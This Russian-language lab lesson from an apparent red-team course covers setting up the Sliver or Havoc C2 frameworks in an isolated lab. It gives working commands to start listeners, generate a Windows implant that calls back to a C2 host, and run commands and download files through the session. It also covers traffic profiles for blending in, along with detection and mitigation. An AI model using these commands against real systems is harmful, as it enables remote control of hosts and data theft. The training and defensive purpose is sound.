# 13.3 — C2: Sliver/Havoc

> **M13 · Этап 2 · 6 ч · 🔴 · артефакт:** `labs/m13-initial-access-c2/l03-c2/`

## Цель

Развернуть C2-фреймворк, получить сессию с лабораторной ВМ и понять архитектуру: listener, implant, профиль, канал, оператор.

## Результат

- Рабочий Sliver (или Havoc) в лаборатории.
- Сессия с `WIN01`.
- Схема канала и список артефактов.

## Теория

### 1. Архитектура

```text
Оператор → teamserver → listener → implant (жертва)
                ↑
            redirector
```

- **Teamserver** — управление, база, API.
- **Listener** — точка входа (HTTP/HTTPS/mTLS/DNS).
- **Implant** — код на хосте.
- **Profile** — как выглядит трафик.
- **Redirector** — прокси между интернетом и teamserver.

### 2. Sliver

Open-source, на Go. Основные команды:

```bash
sliver-server
# в консоли
mtls --lport 8888
https --lport 443 --domain c2.training.lab
generate --http https://c2.training.lab --os windows --arch amd64 --format exe -o implant.exe
sessions
use <session-id>
```

Плюсы: простой, кроссплатформенный, есть BOF/armory.
Минусы: публичные сигнатуры, узнаваемые профили по умолчанию.

### 3. Havoc

Более «операторский» UI, гибкие профили, инжект. Требует больше настройки. Для обучения достаточно одного фреймворка, второй — по желанию.

### 4. Каналы

| Канал | Плюс | Минус |
|---|---|---|
| HTTPS | сливается с web | TLS-инспекция, JA3 |
| mTLS | быстрый, прямой | нестандартный порт |
| DNS | обходит многие прокси | медленный, шумный |
| SMB | для lateral | только внутри |
| TCP | простой | легко блокировать |

### 5. Профили

Профиль задаёт URI, заголовки, jitter, sleep, user-agent. Хороший профиль похож на легитимный трафик конкретной сети. Плохой — «стандартный C2».

### 6. Детект

- Сетевые: JA3/JA4, периодичность beacon, необычный User-Agent, домен молодой.
- Хостовые: implant в памяти, автозапуск, named pipes, инжект.
- EDR: поведение процесса, сетевые соединения, загрузка модулей.

## Лаборатория

> `LNX01` (teamserver) + `WIN01` (жертва), сеть VMnet2. Внешний интернет не нужен.

### 1. Запуск

```bash
# на LNX01
sliver-server
```

В консоли:

```text
https --lport 8443 --domain c2.training.lab
```

Ожидаемо: listener активен.

### 2. Implant

```text
generate --http https://10.10.10.50:8443 --os windows --arch amd64 --format exe -o /srv/implant.exe
```

Перенесите на `WIN01` (HTTP/scp в лабе). Запустите.

Ожидаемо: сессия в Sliver (`sessions`).

### 3. Работа с сессией

```text
sessions
use <id>
info
whoami
ps
ls C:\
download C:\lab\test.txt
```

Ожидаемо: команды выполняются. Зафиксируйте, какие процессы/файлы создаются.

### 4. Профиль

```text
profiles new --http https://10.10.10.50:8443 --skip-url-encode
```

Сгенерируйте implant с профилем, сравните трафик в `tcpdump`.

### 5. Сеть

```bash
sudo tcpdump -i vmnet2 -nn -A 'host 10.10.10.20 and port 8443' | head -100
```

Ожидаемо: HTTP-запросы. Найдите User-Agent, URI, периодичность.

### 6. Уборка

```text
sessions
kill <id>
```

Удалите implant, остановите listener, верните снимок. Запишите артефакты.

## Атака и защита

- **Атака:** HTTPS + jitter + правдоподобный профиль.
- **Детект:** JA3/JA4, beacon-паттерн, аномальные соединения, EDR.
- **Фикс:** TLS-инспекция, egress-фильтрация, proxy, EDR, DNS-мониторинг.
